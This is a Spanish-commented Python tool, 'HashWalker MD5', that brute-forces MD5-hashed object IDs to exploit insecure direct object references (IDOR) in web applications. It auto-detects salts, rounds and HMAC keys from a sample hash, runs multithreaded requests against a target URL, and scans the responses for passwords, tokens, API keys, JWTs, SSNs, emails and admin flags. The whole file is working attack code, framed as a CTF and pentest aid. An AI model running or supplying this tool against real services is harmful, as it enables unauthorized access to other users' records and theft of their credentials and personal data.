#!/usr/bin/env python3
"""
HashWalker MD5 — Advanced MD5 IDOR Enumeration Tool 
===========================================================
Autor: nnpqo (Especializado para MD5 Avanzado)
"""

import hashlib
import hmac
import base64
import requests
import argparse
import sys
import time
import re
import json
import csv
import os
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─── Colores ──────────────────────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    MAGENTA= "\033[95m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

def banner():
    print(f"""{C.CYAN}{C.BOLD}
╔══════════════════════════════════════════════════════════════╗
║        HashWalker MD5 — Advanced MD5 Enumeration Tool        ║
║   Specialized for CTFs · Salts · Rounds · HMAC · AutoDetect   ║
╚══════════════════════════════════════════════════════════════╝
{C.RESET}""")

# ─── Validación de Hash ───────────────────────────────────────────────────────
def validate_md5_hash(sample_hash: str) -> bool:
    h = sample_hash.strip().lower()
    # Hex MD5 (32 chars)
    if len(h) == 32 and re.fullmatch(r"[0-9a-f]{32}", h):
        return True
    # Hex MD5 16-char (16 chars)
    if len(h) == 16 and re.fullmatch(r"[0-9a-f]{16}", h):
        return True
    # Base64 raw MD5 (22-24 chars, can end with ==)
    if len(h) in (22, 23, 24) and re.fullmatch(r"[a-z0-9+/=-]+", h, re.IGNORECASE):
        return True
    return False

# ─── Hasheador MD5 Avanzado ───────────────────────────────────────────────────
def compute_advanced_md5(
    value: str,
    salt: str = "",
    salt_pos: str = "suffix",
    rounds: int = 1,
    round_format: str = "hex",  # "hex" o "raw"
    format_type: str = "hex-lower",  # hex-lower, hex-upper, 16-hex-lower, 16-hex-upper, base64-raw, base64-hex, base64-url-raw, base64-url-hex
    hmac_key: str = None
) -> str:
    # Aplicar salt / construir input inicial
    if hmac_key:
        key_bytes = hmac_key.encode('utf-8', errors='ignore')
        if salt:
            if salt_pos == "prefix":
                msg = salt + value
            elif salt_pos == "both":
                msg = salt + value + salt
            else:
                msg = value + salt
        else:
            msg = value
        
        h = hmac.new(key_bytes, msg.encode('utf-8', errors='ignore'), hashlib.md5)
        digest = h.digest()
        hexdigest = h.hexdigest()
        
        for _ in range(rounds - 1):
            if round_format == "hex":
                h = hmac.new(key_bytes, hexdigest.encode('utf-8'), hashlib.md5)
            else:
                h = hmac.new(key_bytes, digest, hashlib.md5)
            digest = h.digest()
            hexdigest = h.hexdigest()
    else:
        if salt:
            if salt_pos == "prefix":
                text = salt + value
            elif salt_pos == "both":
                text = salt + value + salt
            else:
                text = value + salt
        else:
            text = value
            
        h = hashlib.md5(text.encode('utf-8', errors='ignore'))
        digest = h.digest()
        hexdigest = h.hexdigest()
        
        for _ in range(rounds - 1):
            if round_format == "hex":
                h = hashlib.md5(hexdigest.encode('utf-8'))
            else:
                h = hashlib.md5(digest)
            digest = h.digest()
            hexdigest = h.hexdigest()
            
    # Formateo final
    if format_type == "hex-lower":
        return hexdigest.lower()
    elif format_type == "hex-upper":
        return hexdigest.upper()
    elif format_type == "16-hex-lower":
        return hexdigest[8:24].lower()
    elif format_type == "16-hex-upper":
        return hexdigest[8:24].upper()
    elif format_type == "base64-raw":
        return base64.b64encode(digest).decode('utf-8').strip()
    elif format_type == "base64-hex":
        return base64.b64encode(hexdigest.encode('utf-8')).decode('utf-8').strip()
    elif format_type == "base64-url-raw":
        b64 = base64.urlsafe_b64encode(digest).decode('utf-8')
        return b64.rstrip('=')
    elif format_type == "base64-url-hex":
        b64 = base64.urlsafe_b64encode(hexdigest.encode('utf-8')).decode('utf-8')
        return b64.rstrip('=')
    else:
        return hexdigest.lower()

# ─── Auto-detección de Esquema (Reverse Engineering) ─────────────────────────
def find_md5_scheme(sample_val: str, target_hash: str, salt_candidates: list[str] = None) -> dict | None:
    target = target_hash.strip()
    salts = [""]
    if salt_candidates:
        salts.extend(salt_candidates)
        
    formats = [
        "hex-lower", "hex-upper",
        "16-hex-lower", "16-hex-upper",
        "base64-raw", "base64-hex",
        "base64-url-raw", "base64-url-hex"
    ]
    salt_positions = ["suffix", "prefix", "both"]
    round_formats = ["hex", "raw"]
    
    # 1. Probar MD5 Normal y con Sales
    for salt in salts:
        for pos in salt_positions:
            for rounds in range(1, 6):
                for rf in round_formats:
                    for fmt in formats:
                        try:
                            candidate_hash = compute_advanced_md5(
                                value=sample_val,
                                salt=salt,
                                salt_pos=pos,
                                rounds=rounds,
                                round_format=rf,
                                format_type=fmt
                            )
                            if candidate_hash == target:
                                return {
                                    "salt": salt,
                                    "salt_pos": pos,
                                    "rounds": rounds,
                                    "round_format": rf,
                                    "format_type": fmt,
                                    "hmac_key": None
                                }
                        except Exception:
                            continue
                            
    # 2. Probar HMAC-MD5 (Tratar candidatos a sal como llaves HMAC)
    if salt_candidates:
        for key in salt_candidates:
            for rounds in range(1, 4):
                for rf in round_formats:
                    for fmt in formats:
                        try:
                            candidate_hash = compute_advanced_md5(
                                value=sample_val,
                                rounds=rounds,
                                round_format=rf,
                                format_type=fmt,
                                hmac_key=key
                            )
                            if candidate_hash == target:
                                return {
                                    "salt": "",
                                    "salt_pos": "suffix",
                                    "rounds": rounds,
                                    "round_format": rf,
                                    "format_type": fmt,
                                    "hmac_key": key
                                }
                        except Exception:
                            continue
                            
    return None

# ─── Generadores de candidatos ────────────────────────────────────────────────
def generate_candidates(mode, wordlist, start, end, prefix, suffix) -> list[str]:
    candidates = []
    if mode == "numeric":
        candidates = [str(i) for i in range(start, end + 1)]
    elif mode in ("email", "username", "wordlist"):
        if not wordlist:
            print(f"{C.RED}[!] Modo '{mode}' requiere --wordlist.{C.RESET}")
            sys.exit(1)
        with open(wordlist) as f:
            candidates = [l.strip() for l in f if l.strip()]
    elif mode == "mixed":
        candidates = [str(i) for i in range(start, end + 1)]
        if wordlist:
            with open(wordlist) as f:
                candidates += [l.strip() for l in f if l.strip()]

    if prefix or suffix:
        candidates = [f"{prefix}{c}{suffix}" for c in candidates]
    return candidates

# ─── Patrones de detección para CTFs / Pentesting ─────────────────────────────
DEFAULT_PATTERNS = [
    # CTF flags comunes
    r"flag\{[^}]+\}",
    r"ctf\{[^}]+\}",
    r"picoCTF\{[^}]+\}",
    r"FLAG\{[^}]+\}",
    r"HTB\{[^}]+\}",
    # Datos sensibles / PII
    r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b",  # email
    r"\b\d{3}[-.\s]?\d{3}[-.\s]?\d{4}\b",                      # teléfono US
    r"\"password\"\s*:",
    r"\"token\"\s*:",
    r"\"secret\"\s*:",
    r"\"api_key\"\s*:",
    r"\"ssn\"\s*:",
    # Indicadores de acceso privilegiado
    r"\"role\"\s*:\s*\"admin\"",
    r"\"is_admin\"\s*:\s*true",
    r"\"admin\"\s*:\s*true",
    r"superuser",
    r"\"permissions\"\s*:",
    # Tokens y credenciales comunes
    r"Bearer\s+[A-Za-z0-9\-._~+/]+=*",
    r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",  # JWT
]

def check_patterns(text: str, patterns: list[str]) -> tuple[bool, str]:
    for pat in patterns:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            return True, m.group(0)
    return False, ""

# ─── Baseline para detección por anomalía ────────────────────────────────────
def get_baseline(session: requests.Session, url: str, method: str, data: dict | None,
                 salt: str, salt_pos: str, rounds: int, round_format: str, format_type: str, hmac_key: str) -> dict:
    """Hace una petición con un candidato inválido para obtener la respuesta 'normal'."""
    fake_hash = compute_advanced_md5(
        value="invalid_candidate_for_baseline_9999",
        salt=salt,
        salt_pos=salt_pos,
        rounds=rounds,
        round_format=round_format,
        format_type=format_type,
        hmac_key=hmac_key
    )
    probe_url = url.replace("{hash}", fake_hash) if "{hash}" in url else urljoin(url.rstrip("/") + "/", fake_hash)
    try:
        resp = _make_request(session, probe_url, method, data)
        return {"status": resp.status_code, "length": len(resp.text), "url": probe_url}
    except Exception:
        return {"status": None, "length": None, "url": probe_url}

def is_anomalous(resp: requests.Response, baseline: dict, threshold: int = 50) -> bool:
    """Devuelve True si la respuesta difiere significativamente del baseline."""
    if baseline["status"] is None:
        return False
    if resp.status_code != baseline["status"]:
        return True
    if baseline["length"] is not None:
        diff = abs(len(resp.text) - baseline["length"])
        if diff >= threshold:
            return True
    return False

# ─── HTTP helper ──────────────────────────────────────────────────────────────
def _make_request(session: requests.Session, url: str, method: str, data: dict | None) -> requests.Response:
    method = method.upper()
    if method == "GET":
        return session.get(url, timeout=10)
    elif method == "POST":
        return session.post(url, data=data or {}, timeout=10)
    elif method == "PUT":
        return session.put(url, data=data or {}, timeout=10)
    else:
        return session.get(url, timeout=10)

# ─── Worker ───────────────────────────────────────────────────────────────────
def probe(candidate: str, url_template: str, base_url: str,
          session: requests.Session, patterns: list[str], baseline: dict | None,
          anomaly_threshold: int, delay: float, verbose: bool,
          method: str, post_data: dict | None,
          salt: str, salt_pos: str, rounds: int, round_format: str, format_type: str, hmac_key: str) -> dict | None:

    h = compute_advanced_md5(
        value=candidate,
        salt=salt,
        salt_pos=salt_pos,
        rounds=rounds,
        round_format=round_format,
        format_type=format_type,
        hmac_key=hmac_key
    )
    
    if "{hash}" in url_template:
        url = url_template.replace("{hash}", h)
    else:
        url = urljoin(base_url.rstrip("/") + "/", h)

    try:
        resp = _make_request(session, url, method, post_data)
        found_pattern, match = check_patterns(resp.text, patterns)
        anomaly = is_anomalous(resp, baseline, anomaly_threshold) if baseline else False

        if verbose:
            sc = C.GREEN if resp.status_code == 200 else C.YELLOW
            tag = f"{C.MAGENTA}[ANOMALY]{C.RESET} " if anomaly else ""
            tag += f"{C.GREEN}[MATCH]{C.RESET} " if found_pattern else ""
            print(f"  {sc}[{resp.status_code}]{C.RESET} {tag}{candidate} → {h[:16]}... | {url}")

        if found_pattern or anomaly:
            return {
                "candidate": candidate,
                "hash":      h,
                "url":       url,
                "status":    resp.status_code,
                "length":    len(resp.text),
                "match":     match if found_pattern else "(anomalía de respuesta)",
                "anomaly":   anomaly,
                "body":      resp.text[:2000],
            }

    except requests.RequestException as e:
        if verbose:
            print(f"  {C.RED}[ERR]{C.RESET} {url} → {e}")

    if delay > 0:
        time.sleep(delay)
    return None

# ─── Impresión de hits ────────────────────────────────────────────────────────
def print_hit(r: dict):
    tag = f"{C.MAGENTA}ANOMALÍA{C.RESET}" if r["anomaly"] and not r["match"].startswith("(") else f"{C.GREEN}MATCH{C.RESET}"
    print(f"\n{C.GREEN}{C.BOLD}[HIT! {tag}] ══════════════════════════════════{C.RESET}")
    print(f"  Candidato : {r['candidate']}")
    print(f"  Hash      : {r['hash']}")
    print(f"  URL       : {r['url']}")
    print(f"  HTTP      : {r['status']}  |  Tamaño: {r['length']} bytes")
    print(f"  Detección : {C.GREEN}{C.BOLD}{r['match']}{C.RESET}")
    print(f"{C.GREEN}{C.BOLD}══════════════════════════════════════════════{C.RESET}\n")

# ─── Exportación ──────────────────────────────────────────────────────────────
def export_results(results: list[dict], path: str):
    ext = os.path.splitext(path)[1].lower()
    if ext == ".json":
        with open(path, "w") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
    elif ext == ".csv":
        with open(path, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=["candidate","hash","url","status","length","match","anomaly"])
            writer.writeheader()
            for r in results:
                writer.writerow({k: r[k] for k in ["candidate","hash","url","status","length","match","anomaly"]})
    else:
        with open(path, "w") as f:
            for r in results:
                f.write(f"candidate={r['candidate']}\nhash={r['hash']}\nurl={r['url']}\nmatch={r['match']}\n\n")
    print(f"\n{C.BLUE}[*]{C.RESET} Resultados guardados en: {C.BOLD}{path}{C.RESET}")

# ─── Motor principal ──────────────────────────────────────────────────────────
def run(args):
    banner()

    # ── Sesión HTTP ──
    session = requests.Session()
    session.verify = not args.no_verify

    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}
        print(f"{C.BLUE}[*]{C.RESET} Proxy: {args.proxy}")

    if args.cookie:
        for pair in args.cookie.split(";"):
            pair = pair.strip()
            if "=" in pair:
                k, v = pair.split("=", 1)
                session.cookies.set(k.strip(), v.strip())

    if args.header:
        for h in args.header:
            k, v = h.split(":", 1)
            session.headers[k.strip()] = v.strip()

    session.headers.setdefault("User-Agent", "Mozilla/5.0 (HashWalker MD5 Pentest; authorized)")

    # ── Auto-detección de esquema MD5 ──
    if args.sample_hash and args.sample_value:
        print(f"{C.BLUE}[*]{C.RESET} Ejecutando buscador automático de esquema MD5...")
        salt_candidates = []
        if args.salt_list:
            if os.path.exists(args.salt_list):
                with open(args.salt_list, "r") as f:
                    salt_candidates = [l.strip() for l in f if l.strip()]
            else:
                salt_candidates = [s.strip() for s in args.salt_list.split(",") if s.strip()]
        
        # Añadir sales comunes por si acaso
        common_salts = ["admin", "salt", "secret", "key", "ctf", "flag"]
        for s in common_salts:
            if s not in salt_candidates:
                salt_candidates.append(s)
                
        scheme = find_md5_scheme(args.sample_value, args.sample_hash, salt_candidates)
        if scheme:
            print(f"{C.GREEN}{C.BOLD}[✓] ¡Esquema MD5 detectado con éxito!{C.RESET}")
            print(f"    · Salt         : {repr(scheme['salt'])}")
            print(f"    · Salt Pos     : {scheme['salt_pos']}")
            print(f"    · Rounds       : {scheme['rounds']}")
            print(f"    · Round Format : {scheme['round_format']}")
            print(f"    · Format       : {scheme['format_type']}")
            if scheme['hmac_key']:
                print(f"    · HMAC Key     : {repr(scheme['hmac_key'])}")
            print()
            
            # Aplicar configuración detectada
            args.salt = scheme['salt']
            args.salt_pos = scheme['salt_pos']
            args.rounds = scheme['rounds']
            args.round_format = scheme['round_format']
            args.format = scheme['format_type']
            args.hmac_key = scheme['hmac_key']
        else:
            print(f"{C.RED}[!] No se pudo encontrar un esquema MD5 coincidente con la muestra. Usando parámetros manuales.{C.RESET}\n")
    elif args.sample_hash:
        # Validar el formato
        if validate_md5_hash(args.sample_hash):
            print(f"{C.BLUE}[*]{C.RESET} Hash de muestra '{args.sample_hash}' tiene formato MD5 correcto.")
        else:
            print(f"{C.YELLOW}[!] Advertencia: Hash de muestra '{args.sample_hash}' no parece MD5 estándar o 16-char.{C.RESET}")

    # ── Patrones ──
    patterns = DEFAULT_PATTERNS.copy()
    if args.no_default_patterns:
        patterns = []
    if args.pattern:
        patterns += args.pattern

    # ── POST data ──
    post_data = None
    if args.data:
        post_data = {}
        for pair in args.data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                post_data[k] = v

    # ── Candidatos ──
    print(f"{C.BLUE}[*]{C.RESET} Modo: {C.BOLD}{args.mode}{C.RESET} | Método HTTP: {C.BOLD}{args.method}{C.RESET}")
    print(f"{C.BLUE}[*]{C.RESET} Esquema MD5: Salt={repr(args.salt)} (pos: {args.salt_pos}) | Rounds={args.rounds} (int: {args.round_format}) | Format={args.format} | HMAC={repr(args.hmac_key)}")
    candidates = generate_candidates(args.mode, args.wordlist, args.start, args.end, args.prefix or "", args.suffix or "")
    print(f"{C.BLUE}[*]{C.RESET} Candidatos: {C.BOLD}{len(candidates)}{C.RESET}  |  Target: {args.url}")

    # ── Baseline ──
    baseline = None
    if args.anomaly:
        print(f"{C.BLUE}[*]{C.RESET} Obteniendo baseline (detección por anomalía activada)...")
        baseline = get_baseline(
            session, args.url, args.method, post_data,
            args.salt, args.salt_pos, args.rounds, args.round_format, args.format, args.hmac_key
        )
        if baseline["status"] is not None:
            print(f"{C.BLUE}[*]{C.RESET} Baseline → HTTP {baseline['status']} | {baseline['length']} bytes\n")
        else:
            print(f"{C.YELLOW}[!] No se pudo obtener baseline. La detección por anomalía puede no funcionar.{C.RESET}\n")

    results = []
    stop_on_first = args.stop_on_first

    # ── Ejecución ──
    if args.threads > 1:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(
                    probe, c, args.url, args.url,
                    session, patterns, baseline, args.anomaly_threshold,
                    args.delay, args.verbose, args.method, post_data,
                    args.salt, args.salt_pos, args.rounds, args.round_format, args.format, args.hmac_key
                ): c for c in candidates
            }
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    print_hit(result)
                    if stop_on_first:
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
    else:
        for c in candidates:
            result = probe(c, args.url, args.url,
                           session, patterns, baseline, args.anomaly_threshold,
                           args.delay, args.verbose, args.method, post_data,
                           args.salt, args.salt_pos, args.rounds, args.round_format, args.format, args.hmac_key)
            if result:
                results.append(result)
                print_hit(result)
                if stop_on_first:
                    break

    # ── Resumen ──
    print(f"\n{C.BOLD}{'─'*60}{C.RESET}")
    if results:
        print(f"{C.GREEN}{C.BOLD}[✓] {len(results)} hit(s) encontrado(s){C.RESET}")
        for r in results:
            print(f"  {r['url']}  [{r['status']}]  → {r['match']}")
        if args.output:
            export_results(results, args.output)
    else:
        print(f"{C.YELLOW}[-] No se encontraron hits.{C.RESET}")
        print(f"    Sugerencias:")
        print(f"      · Activa detección por anomalía: --anomaly")
        print(f"      · Usa una muestra para autodetección: --sample-hash <hash> --sample-value <val>")
        print(f"      · Aumenta el rango: --start 1 --end 1000")
        print(f"      · Usa --verbose para ver todas las respuestas")

# ─── Modo Wizard (interactivo) ────────────────────────────────────────────────
def wizard():
    banner()
    print(f"{C.CYAN}{C.BOLD}[WIZARD] Configuración rápida de HashWalker MD5 (CTF Edition){C.RESET}")
    print("Por favor, introduce los datos básicos para iniciar el escaneo:\n")

    # 1. URL
    print(f"{C.BOLD}1. URL objetivo{C.RESET}")
    print("   Ejemplo: http://ejemplo.com/api/user/{hash} (usa {hash} como placeholder)")
    while True:
        url = input(f"{C.BOLD}   Introduce la URL: {C.RESET}").strip()
        if url:
            break
        print(f"   {C.RED}[!] La URL es obligatoria.{C.RESET}")

    # 2. Rangos
    print(f"\n{C.BOLD}2. Rango de números para generar los candidatos{C.RESET}")
    while True:
        try:
            start = int(input(f"{C.BOLD}   Inicio del rango (ej. 1): {C.RESET}").strip() or "1")
            break
        except ValueError:
            print(f"   {C.RED}[!] Por favor, introduce un número válido.{C.RESET}")

    while True:
        try:
            end = int(input(f"{C.BOLD}   Fin del rango (ej. 100): {C.RESET}").strip() or "100")
            if end >= start:
                break
            print(f"   {C.RED}[!] El fin del rango debe ser mayor o igual al inicio ({start}).{C.RESET}")
        except ValueError:
            print(f"   {C.RED}[!] Por favor, introduce un número válido.{C.RESET}")

    # Opciones por defecto
    salt = ""
    salt_pos = "suffix"
    rounds = 1
    round_format = "hex"
    format_type = "hex-lower"
    hmac_key = None
    method = "GET"
    threads = 5
    anomaly = True
    cookie = None
    proxy = None
    mode = "numeric"
    wordlist = None

    print(f"\n{C.BOLD}3. Opciones avanzadas de MD5 y Red (Por defecto: MD5 estándar, GET, 5 hilos, Detección de anomalías){C.RESET}")
    customize = input(f"   ¿Deseas personalizar las opciones avanzadas? (s/N): {C.RESET}").strip().lower()

    if customize == "s":
        # 3.1 MD5 Configuración Avanzada
        print(f"\n   {C.BOLD}Configuración del Hash MD5:{C.RESET}")
        
        # Salt
        salt = input("   Salt a aplicar (deja vacío para ninguno): ").strip()
        if salt:
            print("   Posición del Salt:")
            print("   [1] Sufijo (ej. valor+salt) [por defecto]")
            print("   [2] Prefijo (ej. salt+valor)")
            print("   [3] Ambos (ej. salt+valor+salt)")
            choice_pos = input("   Selecciona (1-3): ").strip()
            if choice_pos == "2":
                salt_pos = "prefix"
            elif choice_pos == "3":
                salt_pos = "both"
            else:
                salt_pos = "suffix"

        # HMAC
        hmac_input = input("\n   Clave HMAC-MD5 (deja vacío para MD5 tradicional): ").strip()
        hmac_key = hmac_input if hmac_input else None

        # Rounds
        while True:
            try:
                rounds_input = input("\n   Número de rondas/iteraciones de hash [1]: ").strip()
                if not rounds_input:
                    rounds = 1
                    break
                rounds = int(rounds_input)
                if rounds > 0:
                    break
                print(f"   {C.RED}[!] Debe ser mayor que 0.{C.RESET}")
            except ValueError:
                print(f"   {C.RED}[!] Por favor, introduce un número válido.{C.RESET}")

        if rounds > 1:
            print("   Formato intermedio de las rondas:")
            print("   [1] Hexadecimal (ej. md5(md5_hex(val))) [por defecto]")
            print("   [2] Raw/Binario (ej. md5(md5_raw(val)))")
            choice_rf = input("   Selecciona (1-2): ").strip()
            round_format = "raw" if choice_rf == "2" else "hex"

        # Formato final
        print(f"\n   {C.BOLD}Formato del Hash MD5 final:{C.RESET}")
        print("   [1] Hexadecimal minúsculas (32 caracteres) [por defecto]")
        print("   [2] Hexadecimal mayúsculas (32 caracteres)")
        print("   [3] 16 caracteres hexadecimal minúsculas (middle 16 chars)")
        print("   [4] 16 caracteres hexadecimal mayúsculas")
        print("   [5] Base64 (raw digest)")
        print("   [6] Base64 (hex string)")
        print("   [7] Base64 URL-safe (raw digest, sin padding)")
        print("   [8] Base64 URL-safe (hex string, sin padding)")
        choice_fmt = input("   Selecciona (1-8) [1]: ").strip()
        fmt_map = {
            "1": "hex-lower",
            "2": "hex-upper",
            "3": "16-hex-lower",
            "4": "16-hex-upper",
            "5": "base64-raw",
            "6": "base64-hex",
            "7": "base64-url-raw",
            "8": "base64-url-hex"
        }
        format_type = fmt_map.get(choice_fmt, "hex-lower")

        # Selección de Método HTTP
        print(f"\n   {C.BOLD}Métodos HTTP disponibles:{C.RESET}")
        print("   [1] GET (por defecto)")
        print("   [2] POST")
        print("   [3] PUT")
        choice_method = input("   Selecciona el método HTTP (1-3) [1]: ").strip()
        if choice_method == "2":
            method = "POST"
        elif choice_method == "3":
            method = "PUT"
        else:
            method = "GET"

        # Detección de anomalías
        print(f"\n   {C.BOLD}Detección por Anomalía (compara respuestas contra error/baseline):{C.RESET}")
        print("   [1] Sí, activar (por defecto)")
        print("   [2] No, usar solo patrones de búsqueda")
        choice_anomaly = input("   Selecciona una opción (1-2) [1]: ").strip()
        anomaly = False if choice_anomaly == "2" else True

        # Número de hilos
        while True:
            try:
                threads_input = input(f"\n   Número de hilos/conexiones simultáneas [5]: ").strip()
                if not threads_input:
                    threads = 5
                    break
                threads = int(threads_input)
                if threads > 0:
                    break
                print(f"   {C.RED}[!] El número de hilos debe ser mayor que 0.{C.RESET}")
            except ValueError:
                print(f"   {C.RED}[!] Por favor, introduce un número válido.{C.RESET}")

        # Cookies y proxy opcionales
        cookie_input = input("\n   Cookie de sesión (deja vacío para ninguna): ").strip()
        cookie = cookie_input if cookie_input else None

        proxy_input = input("   Proxy (deja vacío para ninguno, ej. http://127.0.0.1:8080): ").strip()
        proxy = proxy_input if proxy_input else None

    # Construir args
    class Args:
        pass
    a = Args()
    a.url = url
    a.salt = salt
    a.salt_pos = salt_pos
    a.rounds = rounds
    a.round_format = round_format
    a.format = format_type
    a.hmac_key = hmac_key
    a.sample_hash = None
    a.sample_value = None
    a.salt_list = None
    a.mode = mode
    a.wordlist = wordlist
    a.start = start
    a.end = end
    a.prefix = None
    a.suffix = None
    a.method = method
    a.cookie = cookie
    a.header = None
    a.data = None
    a.proxy = proxy
    a.no_verify = False
    a.delay = 0
    a.threads = threads
    a.pattern = None
    a.no_default_patterns = False
    a.anomaly = anomaly
    a.anomaly_threshold = 50
    a.stop_on_first = False
    a.output = None
    a.verbose = True

    print(f"\n{C.GREEN}[*] Configuración completa. Iniciando escaneo...{C.RESET}\n")
    run(a)

# ─── CLI ──────────────────────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(
        prog="idor_md5_enum.py",
        description="HashWalker MD5 — Advanced MD5 Enumeration Tool para CTFs",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
MODO FÁCIL (wizard interactivo):
  python3 idor_md5_enum.py --wizard

EJEMPLOS DE CONFIGURACIONES AVANZADAS DE MD5:
  # Rango numérico, MD5 con Sal (sufijo):
  python3 idor_md5_enum.py -u "http://target.com/api/user/{hash}" --salt "secret_salt" --start 1 --end 100

  # MD5 con 2 rondas de hashing y formato 16-char en mayúsculas:
  python3 idor_md5_enum.py -u "http://target.com/profile/{hash}" --rounds 2 --format 16-hex-upper

  # Auto-detectar la configuración MD5 (sal, rondas, formato, etc.) a partir de una muestra:
  python3 idor_md5_enum.py -u "http://target.com/files/{hash}" --sample-hash "c4ca4238a0b923820dcc509a6f75849b" --sample-value "1"

  # Auto-detectar probando con una lista de sales conocidas:
  python3 idor_md5_enum.py -u "http://target.com/files/{hash}" --sample-hash "5f4dcc3b5aa765d61d8327deb882cf99" --sample-value "password" --salt-list "secret,key,salt"
"""
    )

    p.add_argument("--wizard", action="store_true", help="Modo interactivo (recomendado)")

    # Target
    p.add_argument("-u", "--url", help="URL con {hash} como placeholder. Ej: http://host/profile/{hash}")

    # Modo Candidatos
    p.add_argument("--mode", choices=["numeric","email","username","wordlist","mixed"], default="numeric")
    p.add_argument("--wordlist", help="Ruta a wordlist")
    p.add_argument("--start", type=int, default=1)
    p.add_argument("--end",   type=int, default=50)
    p.add_argument("--prefix", help="Prefijo para cada candidato antes de hashear")
    p.add_argument("--suffix", help="Sufijo para cada candidato antes de hashear")

    # Configuración Avanzada de MD5
    p.add_argument("--salt", default="", help="Salt a añadir al candidato")
    p.add_argument("--salt-pos", choices=["prefix", "suffix", "both"], default="suffix", help="Posición de la sal (default: suffix)")
    p.add_argument("--rounds", type=int, default=1, help="Rondas de hash MD5 a aplicar (default: 1)")
    p.add_argument("--round-format", choices=["hex", "raw"], default="hex", help="Formato intermedio en múltiples rondas (default: hex)")
    p.add_argument("--format", choices=["hex-lower", "hex-upper", "16-hex-lower", "16-hex-upper", "base64-raw", "base64-hex", "base64-url-raw", "base64-url-hex"], default="hex-lower", help="Formato final del hash (default: hex-lower)")
    p.add_argument("--hmac-key", help="Clave HMAC-MD5 (si se usa, se calcula HMAC en vez de MD5 tradicional)")
    
    # Auto-detección
    p.add_argument("--sample-hash", help="Hash de muestra para autodetección de esquema")
    p.add_argument("--sample-value", help="Plaintext correspondiente al hash de muestra")
    p.add_argument("--salt-list", help="Lista de sales candidatas (separadas por coma o ruta de archivo) para probar en la autodetección")

    # HTTP / Red
    p.add_argument("--method", choices=["GET","POST","PUT"], default="GET")
    p.add_argument("--data", help="Datos POST/PUT: 'key1=val1&key2=val2'")
    p.add_argument("--cookie", help="Cookies: 'name=val; name2=val2'")
    p.add_argument("--header", action="append", metavar="K:V", help="Headers extra (repetible)")
    p.add_argument("--proxy", help="Proxy HTTP/HTTPS. Ej: http://127.0.0.1:8080 (Burp Suite)")
    p.add_argument("--no-verify", action="store_true", help="Deshabilitar verificación SSL")
    p.add_argument("--delay", type=float, default=0)
    p.add_argument("--threads", type=int, default=1)

    # Detección de Anomalías / Matches
    p.add_argument("--anomaly", action="store_true", help="Activar detección por anomalía en respuesta")
    p.add_argument("--anomaly-threshold", dest="anomaly_threshold", type=int, default=50, help="Diferencia mínima en bytes para considerar anomalía (default: 50)")
    p.add_argument("--pattern", action="append", metavar="REGEX", help="Patrón regex adicional a buscar en respuestas (repetible)")
    p.add_argument("--no-default-patterns", dest="no_default_patterns", action="store_true", help="Deshabilitar patrones por defecto")
    p.add_argument("--stop-on-first", dest="stop_on_first", action="store_true", help="Detener el escaneo inmediatamente al encontrar el primer hit")

    # Output
    p.add_argument("-o", "--output", help="Archivo de salida (.json, .csv o .txt)")
    p.add_argument("-v", "--verbose", action="store_true")

    return p.parse_args()

if __name__ == "__main__":
    args = parse_args()
    if args.wizard or not args.url:
        wizard()
    else:
        run(args)
